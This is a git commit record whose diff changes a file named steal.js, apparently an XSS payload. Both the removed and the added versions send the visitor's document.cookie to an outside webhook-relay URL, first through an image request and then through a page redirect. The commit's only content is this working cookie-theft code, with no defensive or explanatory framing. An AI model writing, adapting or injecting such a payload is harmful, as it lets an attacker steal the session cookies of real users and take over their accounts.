19d1aa16ac96e9043ef2ca4272261558fcf2eb06
GoKonggg <kongisinthehouse@gmail.com>
2026-07-14 20:26:29 +0700

    update webhook

--- steal.js
+++ steal.js
@@ -1,3 +1,3 @@
-new Image().src =
-"https://bin.webhookrelay.com/v1/webhooks/0e65490e-7f29-48c5-ab1c-517a1b280498?data="
-+ encodeURIComponent(document.cookie);
+location =
+  "https://bin.webhookrelay.com/v1/webhooks/0e65490e-7f29-48c5-ab1c-517a1b260498?data=" +
+  encodeURIComponent(document.cookie);
